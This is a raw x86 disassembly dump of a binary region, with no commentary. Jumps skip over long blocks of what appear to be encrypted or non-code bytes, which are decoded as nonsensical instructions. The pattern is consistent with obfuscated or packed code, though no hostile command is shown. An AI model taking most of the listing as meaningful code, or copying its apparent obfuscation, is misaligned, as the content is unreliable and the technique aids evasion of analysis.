  40bf79:	sbb    eax,0x85575145
  40bf7e:	mov    ecx,0x610c8815
  40bf83:	loope  0x40bf10
  40bf85:	jge    0x40bf8f
  40bf87:	mov    edi,DWORD PTR [edi]
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	mov    ecx,DWORD PTR [edi-0x69c16598]
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	mov    bh,0x1c
  40bfcb:	xor    DWORD PTR [ebp-0x65c6db47],edi
  40bfd1:	xchg   BYTE PTR [edx-0x3],al
  40bfd4:	repnz call 0xef17:0x7f3f86bd
  40bfdc:	mov    ds:0xe5d7c870,al
  40bfe1:	mov    al,0x15
  40bfe3:	int3   
  40bfe4:	push   0xffffff84
  40bfe6:	sub    al,0x78
  40bfe8:	(bad)  
  40bfe9:	lahf   
  40bfea:	js     0x40bf89
  40bfec:	mov    bh,0x77
  40bfee:	pop    eax
  40bfef:	xor    ch,BYTE PTR [edx]
  40bff1:	aad    0x3f
  40bff3:	enter  0xfc7c,0x25
  40bff7:	clc    
  40bff8:	dec    esi
  40bff9:	das    
  40bffa:	push   es
  40bffb:	lahf   
  40bffc:	(bad)  
  40bffe:	mov    al,ds:0x1e265ed9
  40c003:	cmp    eax,0xc46d6761
  40c008:	cmp    eax,DWORD PTR [ebp+edx*1+0x40]
  40c00c:	sub    BYTE PTR [ecx-0x36e40340],bh
  40c012:	dec    esp
  40c013:	add    al,0x8a
  40c015:	mov    edi,0x4c943019
  40c01a:	ins    DWORD PTR es:[edi],dx
  40c01b:	rcr    DWORD PTR [ebx],0xe7
  40c01e:	inc    eax
  40c01f:	out    dx,eax
  40c020:	jne    0x40bfff
  40c022:	mov    dh,0x11
  40c024:	fidiv  DWORD PTR [ecx-0x41e8c43a]
  40c02a:	outs   dx,DWORD PTR ds:[esi]
  40c02b:	imul   eax,DWORD PTR [ebp+ecx*2+0x6b41627b],0x4d8992d6
  40c036:	je     0x40bfce
  40c038:	mov    bh,0x1d
  40c03a:	mov    eax,ds:0x8da627a2
  40c03f:	xlat   BYTE PTR ds:[ebx]
  40c040:	pop    edi
  40c041:	cmp    al,0x68
  40c043:	popa   
  40c044:	push   0x200262be
  40c049:	push   es
  40c04a:	add    al,0x5d
  40c04c:	dec    edx
  40c04d:	inc    ecx
  40c04e:	dec    edi
  40c04f:	push   ebp
  40c050:	inc    BYTE PTR [edi+0x5c169820]
  40c056:	(bad)  
  40c057:	leave  
  40c058:	mov    edi,0x45100e62
  40c05d:	ret    
  40c05e:	dec    edx
  40c05f:	or     ecx,DWORD PTR [eax+eiz*1]
  40c062:	aam    0xe3
  40c064:	xor    ch,BYTE PTR [eax+0x277bea84]
  40c06a:	lea    ebp,[esi+0x76eb77a2]
  40c070:	frstor [ecx]
  40c072:	aad    0xa6
  40c074:	and    BYTE PTR [eax+eax*2-0x5d],cl
  40c078:	test   al,0x2e
  40c07a:	(bad)  
  40c07b:	jmp    FWORD PTR [eax]
  40c07d:	inc    edi
  40c07e:	push   ebp
  40c07f:	or     eax,0xd98f6f0d
  40c084:	push   eax
  40c085:	ror    cl,cl
  40c087:	xchg   ebp,eax
  40c088:	std    
  40c089:	xchg   edi,eax
  40c08a:	shr    BYTE PTR [ebp-0x3e25ccf1],1
  40c090:	or     BYTE PTR [edx-0x45],0xbf
  40c094:	mov    al,0xd
  40c096:	fadd   DWORD PTR [edi-0x79a2df07]
  40c09c:	ins    DWORD PTR es:[edi],dx
  40c09d:	sbb    al,0xca
  40c09f:	es jge 0x40c114
  40c0a2:	repnz bound edi,QWORD PTR [edi-0x584007aa]
  40c0a9:	inc    ebp
  40c0aa:	mov    esp,eax
  40c0ac:	sub    al,0x5e
  40c0ae:	fistp  QWORD PTR [eax]
  40c0b0:	inc    ecx
  40c0b1:	add    ebx,DWORD PTR [ecx]
  40c0b3:	inc    eax
  40c0b4:	fwait
  40c0b5:	mov    ecx,0xfa8369a5
  40c0ba:	(bad)  
  40c0bb:	clc    
  40c0bc:	mov    cl,0xf2
  40c0be:	push   ecx
  40c0bf:	ror    ecx,0x4c
  40c0c2:	and    eax,0xcf3aa42b
  40c0c7:	gs cmp eax,0xa0f144f7
  40c0cd:	push   ebp
  40c0ce:	adc    dl,ch
  40c0d0:	cmp    BYTE PTR [ebp+0x725f07c3],ch
  40c0d6:	inc    edx
  40c0d7:	stos   BYTE PTR es:[edi],al
  40c0d8:	sbb    al,0xe2
  40c0da:	xchg   ebx,eax
  40c0db:	mov    ds:0xe3945ec1,eax
  40c0e0:	xor    al,0xbc
  40c0e2:	push   edx
  40c0e3:	cmc    
  40c0e4:	jecxz  0x40c10f
  40c0e6:	dec    ecx
  40c0e7:	js     0x40c141
  40c0e9:	iret   
  40c0ea:	mov    ds:0x6602df8e,al
  40c0ef:	aas    
  40c0f0:	dec    ebx
  40c0f1:	(bad)  
  40c0f2:	jge    0x40c13b
  40c0f4:	xchg   DWORD PTR [edi+esi*1],ebx
  40c0f7:	in     al,dx
  40c0f8:	rol    DWORD PTR [esi+0x7486376e],cl
  40c0fe:	inc    eax
  40c0ff:	sbb    esi,DWORD PTR [esi+0x6860b727]
  40c105:	(bad)  
  40c106:	mov    cl,0xb3
  40c108:	inc    esi
  40c109:	xchg   edi,eax
  40c10a:	mov    ch,BYTE PTR [edi]
  40c10c:	das    
  40c10d:	repnz imul esi,DWORD PTR [ebp-0x57],0xffffffed
  40c112:	mov    ebp,DWORD PTR [edx]
  40c114:	(bad)  
  40c115:	shl    al,1
  40c117:	or     bl,BYTE PTR [esi-0x78227ac9]
  40c11d:	mov    bh,0xe9
  40c11f:	mov    dh,0xd4
  40c121:	jl     0x40c155
  40c123:	sti    
  40c124:	adc    esp,DWORD PTR [ebp-0x2c]
  40c127:	or     al,0x43
  40c129:	test   BYTE PTR [ecx],0xfb
  40c12c:	mov    gs,WORD PTR [edx+0x21056412]
  40c132:	mov    al,ds:0x445b235c
  40c137:	in     al,dx
  40c138:	fsubr  DWORD PTR ds:0x3c09036a
  40c13e:	sar    ch,1
  40c140:	ret    0x89d7
  40c143:	jecxz  0x40c125
  40c145:	(bad)  
  40c146:	jg     0x40c105
  40c148:	sti    
  40c149:	inc    edx
  40c14a:	shr    ebx,cl
  40c14c:	adc    BYTE PTR [esi],dh
  40c14e:	les    eax,FWORD PTR [ecx+0x36]
  40c151:	push   es
  40c152:	scas   eax,DWORD PTR es:[edi]
  40c153:	jnp    0x40c0fc
  40c155:	(bad)  
  40c156:	push   esp
  40c157:	aad    0xa7
  40c159:	int    0x1d
  40c15b:	jbe    0x40c16f
  40c15d:	mov    dh,0x7f
  40c15f:	adc    DWORD PTR [edx+0x1f99ebae],ecx
  40c165:	mov    ds:0x922fd1d1,eax
  40c16a:	pop    ds
  40c16b:	(bad)  [ecx+0x6aac331a]
  40c171:	mov    edx,0x3523bd7d
  40c176:	xor    al,0xcd
  40c178:	lahf   
  40c179:	leave  
  40c17a:	outs   dx,DWORD PTR ds:[esi]
  40c17b:	and    DWORD PTR [edx],ebx
  40c17d:	popf   
  40c17e:	mov    ch,0x68
  40c180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c181:	cld    
  40c182:	fdiv   st(1),st
  40c184:	(bad)  
  40c186:	jb     0x40c13d
  40c188:	mov    edi,0x930a2dda
  40c18d:	xlat   BYTE PTR ds:[ebx]
  40c18e:	push   ss
  40c18f:	mov    bl,BYTE PTR [ecx+0x4b]
  40c192:	and    DWORD PTR [ebx-0x34],ebp
  40c195:	sbb    DWORD PTR [ebx],esp
  40c197:	data16 jle 0x40c1d1
  40c19a:	in     eax,dx
  40c19b:	loope  0x40c207
  40c19d:	cmp    BYTE PTR [esi-0x7e225cb2],ah
  40c1a3:	popa   
  40c1a4:	lock daa 
  40c1a6:	sub    edi,esi
  40c1a8:	cmp    ebp,DWORD PTR ds:0x65eba841
  40c1ae:	or     al,0x17
  40c1b0:	xor    BYTE PTR [edi-0x5e],dl
  40c1b3:	or     ebx,DWORD PTR [ecx-0xa]
  40c1b6:	mov    dl,0x9a
  40c1b8:	jg     0x40c21e
  40c1ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1bb:	ins    BYTE PTR es:[edi],dx
  40c1bc:	cdq    
  40c1bd:	or     DWORD PTR [ecx-0x3e3c0953],ebx
  40c1c3:	and    eax,0xc8e4d0ea
  40c1c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1c9:	in     eax,dx
  40c1ca:	or     BYTE PTR [esi+0x237d02d],cl
  40c1d0:	sub    esi,DWORD PTR [ebp+0x72ba71b4]
  40c1d6:	dec    esp
  40c1d7:	push   gs
  40c1d9:	push   ebp
  40c1da:	sahf   
  40c1db:	cs aaa 
  40c1dd:	adc    eax,0xa725a387
  40c1e2:	imul   esp,DWORD PTR [ecx+0x73],0x4e92ad41
  40c1e9:	leave  
  40c1ea:	cs aaa 
  40c1ec:	call   FWORD PTR [edi-0x539f510e]
  40c1f2:	(bad)  
  40c1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1f4:	lds    edx,FWORD PTR [ebx+0x14]
  40c1f7:	sbb    bl,0xca
  40c1fa:	mov    DWORD PTR [edx-0x20],0x2c9bf31b
  40c201:	sub    dl,al
  40c203:	sbb    eax,DWORD PTR [esi+0x25]
  40c206:	(bad)  
  40c207:	or     DWORD PTR [eax],edx
  40c209:	retf   
  40c20a:	fistp  QWORD PTR [edx]
  40c20c:	jo     0x40c284
  40c20e:	jo     0x40c1b4
  40c210:	out    0xa9,eax
  40c212:	out    dx,eax
  40c213:	mov    bh,0xb3
  40c215:	xor    eax,0x3427711
  40c21a:	adc    cl,BYTE PTR [edx-0x29deb092]
  40c220:	jmp    0xb06a4910
  40c225:	mov    ah,0x11
  40c227:	int    0xa3
  40c229:	jae    0x40c25e
  40c22b:	gs lods al,BYTE PTR fs:[esi]
  40c22e:	add    eax,0x5c00c746
  40c233:	outs   dx,BYTE PTR ds:[esi]
  40c234:	daa    
  40c235:	retf   
  40c236:	mov    ch,0x6c
  40c238:	repnz out dx,al
  40c23a:	fs inc ebx
  40c23c:	cli    
  40c23d:	push   esp
  40c23e:	(bad)  
  40c23f:	clc    
  40c240:	jne    0x40c1f2
  40c242:	push   esi
  40c243:	shl    cl,0x19
  40c246:	inc    ebp
  40c247:	inc    ebx
  40c248:	in     al,dx
  40c249:	fiadd  DWORD PTR [edi]
  40c24b:	stos   BYTE PTR es:[edi],al
  40c24c:	add    BYTE PTR [esi+0x72],dh
  40c24f:	push   ecx
  40c250:	and    DWORD PTR [ecx+0x65a8904a],0x212cfee7
  40c25a:	inc    edi
  40c25b:	sahf   
  40c25c:	jp     0x40c227
  40c25e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c25f:	call   0xba1:0x93db0886
  40c266:	retf   0xebee
  40c269:	outs   dx,BYTE PTR ds:[esi]
  40c26a:	inc    esp
  40c26b:	mov    dl,0xae
  40c26d:	mov    ch,BYTE PTR ds:0x74af2312
  40c273:	sub    esp,eax
  40c275:	stos   DWORD PTR es:[edi],eax
  40c276:	sub    BYTE PTR [edi+ecx*4+0x10],0x98
  40c27b:	icebp  
  40c27c:	scas   eax,DWORD PTR es:[edi]
  40c27d:	adc    eax,0xc2e5913c
  40c282:	xor    dh,cl
  40c284:	jns    0x40c2e9
  40c286:	retf   0x85e
  40c289:	push   0x15
  40c28b:	mov    ax,ds:0x37754d5a
  40c291:	in     al,0x66
  40c293:	(bad)  
  40c294:	into   
  40c295:	es mov ah,0x89
  40c298:	xor    esp,DWORD PTR [ebx]
  40c29a:	sbb    al,0xf5
  40c29c:	mov    ds:0xaaa7e009,al
  40c2a1:	push   edx
  40c2a2:	dec    edi
  40c2a3:	push   ds
  40c2a4:	mov    ch,0x5
  40c2a6:	inc    ecx
  40c2a7:	sahf   
  40c2a8:	outs   dx,DWORD PTR ds:[esi]
  40c2a9:	pop    edi
  40c2aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ab:	mov    ds:0x99dfdc04,al
  40c2b0:	test   edi,edx
  40c2b2:	mov    ecx,DWORD PTR [ebx-0x28420dcf]
  40c2b8:	frndint 
  40c2ba:	mov    edi,0x6d7d90de
  40c2bf:	das    
  40c2c0:	pop    ss
  40c2c1:	inc    esi
  40c2c2:	sbb    DWORD PTR [esi+0x37],ebp
  40c2c5:	mov    eax,DWORD PTR [ebp-0x28]
  40c2c8:	mov    di,WORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax+0x56],bh
  40c2e3:	dec    eax
  40c2e4:	retf   
  40c2e5:	sar    DWORD PTR [edx],cl
  40c2e7:	fwait
  40c2e8:	js     0x40c362
  40c2ea:	je     0x40c36a
  40c2ec:	js     0x40c366
  40c2ee:	sub    ch,BYTE PTR [edx-0x1f]
  40c2f1:	test   DWORD PTR [edx+0x31],esi
  40c2f4:	pusha  
  40c2f5:	pop    ebp
  40c2f6:	dec    edi
  40c2f7:	lods   al,BYTE PTR ds:[esi]
  40c2f8:	adc    eax,0x4392c679
  40c2fd:	aam    0x7e
  40c2ff:	fbstp  TBYTE PTR fs:[ebp+0x75]
  40c303:	imul   edx,DWORD PTR [edx],0xcf496a17
  40c309:	or     ah,BYTE PTR [ebx+0x2ca26652]
  40c30f:	jmp    FWORD PTR [edx]
  40c311:	mov    es,esi
  40c313:	cmp    BYTE PTR [edx+0x702c0f96],0x1
  40c31a:	ins    BYTE PTR es:[edi],dx
  40c31b:	xor    eax,0xf1496a7d
  40c320:	add    eax,0xa21d1e87
  40c325:	cli    
  40c326:	sti    
  40c327:	sub    DWORD PTR [edx-0x23],ecx
  40c32a:	out    dx,eax
  40c32b:	sbb    al,0xee
  40c32d:	pop    edx
  40c32e:	inc    esp
  40c32f:	mov    ah,0xb8
  40c331:	jmp    0x40c392
  40c333:	push   0xffffffd6
  40c335:	xchg   ebp,eax
  40c336:	jl     0x40c3ad
  40c338:	or     al,0x90
  40c33a:	pusha  
  40c33b:	mov    dl,0x36
  40c33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c33f:	adc    DWORD PTR [edi],eax
  40c341:	call   FWORD PTR [edx-0x1f]
  40c344:	xchg   eax,ecx
  40c346:	sbb    DWORD PTR [esi-0x33],0x14
  40c34a:	jl     0x40c3c2
  40c34c:	(bad)  
  40c34d:	adc    al,0xb6
  40c34f:	addr16 xchg esi,eax
  40c351:	dec    ebp
  40c352:	retf   0x4023
  40c355:	fdiv   QWORD PTR [edx]
  40c357:	into   
  40c358:	or     eax,0xb90277
  40c35d:	idiv   BYTE PTR [esp+esi*4+0x5b]
  40c361:	pop    ss
  40c362:	mov    ebx,?
  40c364:	rcr    DWORD PTR [esi+0x18],0x33
  40c368:	add    DWORD PTR [edx+eiz*2],eax
  40c36b:	or     eax,0x3b05417c
  40c370:	test   bh,bh
  40c372:	pop    eax
  40c373:	es jecxz 0x40c302
  40c376:	cdq    
  40c377:	hlt    
  40c378:	sti    
  40c379:	push   ebx
  40c37a:	sbb    DWORD PTR [ebx-0x8],edi
  40c37d:	inc    esi
  40c37e:	adc    DWORD PTR [ecx],esi
  40c380:	dec    ebp
  40c381:	inc    edi
  40c382:	xor    al,0x47
  40c384:	push   eax
  40c385:	mov    bl,0x1f
  40c387:	ins    BYTE PTR es:[edi],dx
  40c388:	pop    eax
  40c389:	shr    DWORD PTR [esi+0x17],0x60
  40c38d:	mov    ah,BYTE PTR [ebx-0x392a055b]
  40c393:	xchg   esi,eax
  40c394:	or     al,0x9a
  40c396:	inc    ebx
  40c397:	nop
  40c398:	repnz adc al,0xbc
  40c39c:	sub    dh,BYTE PTR [ecx]
  40c39e:	dec    ebp
  40c39f:	mov    ecx,0xe53b64b7
  40c3a4:	xor    al,0xe4
  40c3a6:	std    
  40c3a7:	xchg   ecx,eax
  40c3a8:	jo     0x40c343
  40c3aa:	jbe    0x40c37d
  40c3ac:	fsubr  DWORD PTR [ecx+0x7a28d503]
  40c3b2:	out    0x85,eax
  40c3b4:	cwde   
  40c3b5:	jmp    0x40c42a
  40c3b7:	cld    
  40c3b8:	pop    esp
  40c3b9:	or     BYTE PTR [edx+0x2938d228],bh
  40c3bf:	xlat   BYTE PTR ds:[ebx]
  40c3c0:	push   cs
  40c3c1:	mov    bh,BYTE PTR [eax]
  40c3c3:	cmc    
  40c3c4:	int    0xdc
  40c3c6:	aaa    
  40c3c7:	jae    0x40c3ac
  40c3c9:	idiv   dh
  40c3cb:	stos   BYTE PTR es:[edi],al
  40c3cc:	or     eax,0x2d9a732c
  40c3d1:	ins    DWORD PTR es:[edi],dx
  40c3d2:	and    ecx,0x484bc52b
  40c3d8:	and    eax,0x40f18515
  40c3dd:	inc    edx
  40c3de:	out    0xad,al
  40c3e0:	je     0x40c387
  40c3e2:	or     al,0x13
  40c3e4:	push   ds
  40c3e5:	or     al,0x15
  40c3e7:	jae    0x40c391
  40c3e9:	inc    eax
  40c3ea:	jmp    0x40c42e
  40c3ec:	jno    0x40c465
  40c3ee:	icebp  
  40c3ef:	adc    eax,0x29081907
  40c3f4:	mov    eax,0xad3cddd5
  40c3f9:	sbb    eax,0x432bb9ee
  40c3fe:	(bad)  
  40c3ff:	and    al,0xca
  40c401:	retf   0x50bd
  40c404:	mov    DWORD PTR [edi],edi
  40c406:	add    BYTE PTR [ebp+eiz*2-0x59c4f010],cl
  40c40d:	cmc    
  40c40e:	in     al,dx
  40c40f:	js     0x40c481
  40c411:	and    BYTE PTR [ecx-0x47],ch
  40c414:	out    0x1,eax
  40c416:	cmp    eax,0x91a74040
  40c41b:	icebp  
  40c41c:	inc    DWORD PTR [ecx]
  40c41e:	xchg   ecx,eax
  40c41f:	aaa    
  40c420:	(bad)  
  40c421:	fcomp  st(1)
  40c423:	xchg   esp,eax
  40c424:	pop    edi
  40c425:	jp     0x40c40d
  40c427:	mov    esi,0xb8d5704e
  40c42c:	ins    BYTE PTR es:[edi],dx
  40c42d:	out    0x4e,al
  40c42f:	sub    ecx,DWORD PTR [edx+ebx*8]
  40c432:	(bad)  
  40c433:	jno    0x40c3ef
  40c435:	mov    dl,BYTE PTR [edx]
  40c437:	jbe    0x40c3cb
  40c439:	rol    DWORD PTR [esi+0x2d],1
  40c43c:	jl     0x40c3c0
  40c43e:	cs jle 0x40c445
  40c441:	jae    0x40c438
  40c443:	dec    ebp
  40c444:	or     esi,DWORD PTR [ecx+0x10]
  40c447:	add    ch,al
  40c449:	ins    BYTE PTR es:[edi],dx
  40c44a:	push   ebp
  40c44b:	mov    al,bh
  40c44d:	rcr    ebp,1
  40c44f:	retf   0x8be4
  40c452:	cwde   
  40c453:	inc    ecx
  40c454:	xchg   edi,eax
  40c455:	sub    ecx,ebp
  40c457:	mov    ds:0x4a146ad8,eax
  40c45c:	out    0xcd,eax
  40c45e:	jae    0x40c475
  40c460:	and    ecx,DWORD PTR [esi]
  40c462:	scas   al,BYTE PTR es:[edi]
  40c463:	test   DWORD PTR [ebx-0x37155bdd],ebx
  40c469:	adc    al,0x7e
  40c46b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c46c:	push   ds
  40c46d:	jnp    0x40c4ec
  40c46f:	or     DWORD PTR [ecx-0x3a],ecx
  40c472:	out    0xac,al
  40c474:	leave  
  40c475:	xchg   cl,dh
  40c477:	test   BYTE PTR [eax+0x52fba80a],bl
  40c47d:	mov    WORD PTR [eax],fs
  40c47f:	in     eax,dx
  40c480:	pop    ss
  40c481:	mov    esp,edi
  40c483:	mov    ds:0x94a3d37e,al
  40c488:	int    0x0
  40c48a:	push   ss
  40c48b:	push   esi
  40c48c:	and    edx,ecx
  40c48e:	mov    BYTE PTR [edx+0x37],dh
  40c491:	mov    eax,ds:0x5bfa668b
  40c496:	outs   dx,BYTE PTR ds:[esi]
  40c497:	dec    ebp
  40c499:	jnp    0x40c41d
  40c49b:	dec    esi
  40c49c:	mov    WORD PTR [ebx-0x140d9a3d],ds
  40c4a2:	mov    edi,0x739ec24f
  40c4a7:	test   BYTE PTR [ecx+0x2db6d8ce],al
  40c4ad:	call   0xc9598ea1
  40c4b2:	pop    edx
  40c4b3:	jmp    0xf016:0xd785545d
  40c4ba:	ror    DWORD PTR ds:0x156a5e17,1
  40c4c0:	je     0x40c4ab
  40c4c2:	lock ds stos BYTE PTR es:[edi],al
  40c4c5:	fmul   QWORD PTR [ebx-0x7eccf5c3]
  40c4cb:	js     0x40c53e
  40c4cd:	ins    BYTE PTR es:[edi],dx
  40c4ce:	xchg   esp,eax
  40c4cf:	pop    edi
  40c4d0:	outs   dx,DWORD PTR ds:[esi]
  40c4d1:	shl    DWORD PTR [esi-0x1dd9ecca],0x1a
  40c4d8:	push   ecx
  40c4da:	(bad)  
  40c4db:	mov    eax,0x96c3deda
  40c4e0:	sahf   
  40c4e1:	iret   
  40c4e2:	in     al,dx
  40c4e3:	cmp    eax,0xa7cb46aa
  40c4e8:	pop    es
  40c4e9:	pop    ss
  40c4ea:	jno    0x40c4bd
  40c4ec:	mov    dl,0x0
  40c4ef:	ss pop ss
  40c4f1:	mov    ds:0x910e66db,al
  40c4f6:	cmp    edx,edi
  40c4f8:	sub    esp,DWORD PTR [ebp-0x7b828906]
  40c4fe:	mov    ds:0x5d1e9775,eax
  40c503:	jmp    0xa720:0x3744b5c7
  40c50a:	fmul   st(0),st
  40c50c:	adc    eax,0x53dcda56
  40c511:	pushf  
  40c512:	xor    DWORD PTR [ebx-0x2a],esi
  40c515:	sbb    bh,bh
  40c517:	hlt    
  40c518:	push   edi
  40c519:	inc    ebp
  40c51a:	into   
  40c51b:	call   edx
  40c51d:	sub    cl,bl
  40c51f:	lahf   
  40c520:	fwait
  40c521:	ret    
  40c522:	popa   
  40c523:	ss ins BYTE PTR es:[edi],dx
  40c525:	cmp    eax,0x84164c54
  40c52a:	hlt    
  40c52b:	xchg   edx,eax
  40c52c:	ins    BYTE PTR es:[edi],dx
  40c52d:	dec    ecx
  40c52e:	sbb    dh,ch
  40c530:	inc    eax
  40c531:	sahf   
  40c532:	push   0x5a
  40c534:	and    bl,bh
  40c536:	fwait
  40c537:	mov    cs,WORD PTR [edi-0x14]
  40c53a:	jp     0x40c501
  40c53c:	add    al,0x5c
  40c53e:	int    0xa7
  40c540:	loop   0x40c4c2
  40c542:	pop    ecx
  40c543:	pusha  
  40c544:	div    BYTE PTR ds:0x9d84c09c
  40c54a:	call   0x21f136ef
  40c54f:	jnp    0x40c4fe
  40c551:	jne    0x40c535
  40c553:	fisubr WORD PTR [edi-0x49e182e0]
  40c559:	add    DWORD PTR [esi],ebx
  40c55b:	ja     0x40c57f
  40c55d:	xor    al,BYTE PTR [ebp+ebx*4-0x25]
  40c561:	and    ebp,DWORD PTR [esi]
  40c563:	fcomp  DWORD PTR [edx]
  40c565:	or     esi,DWORD PTR [ebx+0x475769a6]
  40c56b:	jns    0x40c551
  40c56d:	and    BYTE PTR [ebx],dh
  40c56f:	icebp  
  40c570:	addr16 mov al,0xbd
  40c573:	call   0x38f95881
  40c578:	scas   al,BYTE PTR es:[edi]
  40c579:	das    
  40c57a:	pop    es
  40c57b:	and    BYTE PTR [edx-0x75],cl
  40c57e:	and    DWORD PTR [esi+0x2f],esi
  40c581:	outs   dx,DWORD PTR ds:[esi]
  40c582:	pop    ss
  40c583:	icebp  
  40c584:	ret    
  40c585:	sbb    al,dl
  40c587:	nop
  40c588:	inc    edx
  40c589:	or     al,0x38
  40c58b:	das    
  40c58c:	in     eax,0x5b
  40c58e:	jmp    0x40c5b3
  40c590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c591:	shl    BYTE PTR [eax+ebp*2-0x32],1
  40c595:	(bad)  
  40c596:	adc    dh,BYTE PTR [ecx+0x61d11b89]
  40c59c:	ret    0x170
  40c59f:	cmp    al,0x5a
  40c5a1:	int    0x30
  40c5a3:	mov    edx,0x2f679aeb
  40c5a8:	loope  0x40c57d
  40c5aa:	shr    BYTE PTR [ecx+0x6abae222],1
  40c5b0:	fldlg2 
  40c5b2:	sub    BYTE PTR [edi+0x6f943abd],dl
  40c5b8:	out    0x24,al
  40c5ba:	and    DWORD PTR [edx-0xc],esi
  40c5bd:	inc    edx
  40c5be:	inc    esi
  40c5bf:	push   edi
  40c5c0:	sbb    al,0xd4
  40c5c2:	call   0xb17a0e09
  40c5c7:	fisub  DWORD PTR [ecx]
  40c5c9:	mov    al,ds:0xf580f29c
  40c5ce:	rcl    BYTE PTR [eax+ecx*1],0xd
  40c5d2:	sar    DWORD PTR [ebp-0x3f37ae12],1
  40c5d8:	xchg   ebp,eax
  40c5d9:	in     eax,dx
  40c5da:	add    eax,0xb3986ee3
  40c5df:	repnz inc eax
  40c5e1:	jl     0x40c57d
  40c5e3:	xor    eax,0x89807bc2
  40c5e8:	xchg   esp,eax
  40c5e9:	sub    DWORD PTR [esi+0x33],esp
  40c5ec:	sti    
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x5ed2d2f7
  40c613:	or     DWORD PTR [ebx+0x68],0x78789836
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	push   ss
  40c61f:	xchg   esi,eax
  40c620:	push   cs
  40c621:	shl    DWORD PTR [esi+eiz*8+0x49b86af1],1
  40c628:	lahf   
  40c629:	xchg   ebp,eax
  40c62a:	adc    al,0xb9
  40c62c:	cmp    bl,dl
  40c62e:	cmp    al,0xe6
  40c630:	loopne 0x40c602
  40c632:	xor    eax,0x4ad47bf6
  40c637:	push   edi
  40c638:	(bad)  
  40c639:	jge    0x40c6b9
  40c63b:	lock push edi
  40c63d:	push   edi
  40c63e:	mov    eax,0x2ae0a9e0
  40c643:	sbb    BYTE PTR [esi],dl
  40c645:	or     eax,0xb574d9d8
  40c64a:	imul   esp,DWORD PTR [edi],0xfffffffa
  40c64d:	cmp    DWORD PTR [eax+0x43abe541],edi
  40c653:	loop   0x40c618
  40c655:	mov    al,BYTE PTR [ebx]
  40c657:	cwde   
  40c658:	dec    edx
  40c659:	aas    
  40c65a:	call   0x67cab3bd
  40c65f:	aam    0xda
  40c661:	sub    DWORD PTR [eax-0x4],0xffffffff
  40c665:	stos   BYTE PTR es:[edi],al
  40c666:	ret    
  40c667:	out    dx,eax
  40c668:	stos   BYTE PTR es:[edi],al
  40c669:	es int3 
  40c66b:	sub    DWORD PTR [edi-0x27504d91],ebx
  40c671:	xchg   edi,eax
  40c672:	aaa    
  40c673:	sub    BYTE PTR [esi+0x4a],bh
  40c676:	mov    dl,0xba
  40c678:	adc    DWORD PTR [eax+0x1edf1949],0xffffffbd
  40c67f:	jp     0x40c6de
  40c681:	xchg   edx,eax
  40c682:	loope  0x40c6c1
  40c684:	pusha  
  40c685:	or     edi,esi
  40c687:	call   0x371c:0xb400de5b
  40c68e:	dec    eax
  40c68f:	xchg   edx,eax
  40c690:	out    dx,eax
  40c691:	mov    DWORD PTR [edx+0x58e76301],0x823aaba7
  40c69b:	outs   dx,DWORD PTR ds:[esi]
  40c69c:	mov    bh,0xe8
  40c69e:	lock cmp al,0xe
  40c6a1:	sti    
  40c6a2:	mov    ds:0xcfebd68,al
  40c6a7:	mov    esi,0x57491959
  40c6ac:	xchg   esp,eax
  40c6ad:	out    dx,al
  40c6ae:	push   ecx
  40c6af:	mov    al,0x3c
  40c6b1:	stos   BYTE PTR es:[edi],al
  40c6b2:	rcr    BYTE PTR [ebx+eax*2+0x2466deb5],1
  40c6b9:	xor    al,0xbd
  40c6bb:	and    eax,0xfa04e963
  40c6c0:	push   ebp
  40c6c1:	or     ebx,DWORD PTR [ebx+0x1e55591c]
  40c6c7:	push   ebp
  40c6c8:	out    dx,al
  40c6c9:	scas   eax,DWORD PTR es:[edi]
  40c6ca:	or     ecx,edx
  40c6cc:	retf   
  40c6cd:	(bad)  
  40c6ce:	into   
  40c6cf:	icebp  
  40c6d0:	sub    DWORD PTR [eax+ebx*4-0x12],esi
  40c6d4:	rcr    DWORD PTR [edi*1+0x15450aa9],0xc0
  40c6dc:	xchg   esp,eax
  40c6dd:	scas   al,BYTE PTR es:[edi]
  40c6de:	lock jg 0x40c683
  40c6e1:	jae    0x40c6ac
  40c6e3:	in     al,dx
  40c6e4:	mov    bh,0xf2
  40c6e6:	xchg   edi,eax
  40c6e7:	sbb    al,0xdd
  40c6e9:	ss ins DWORD PTR es:[edi],dx
  40c6eb:	cmp    edx,edi
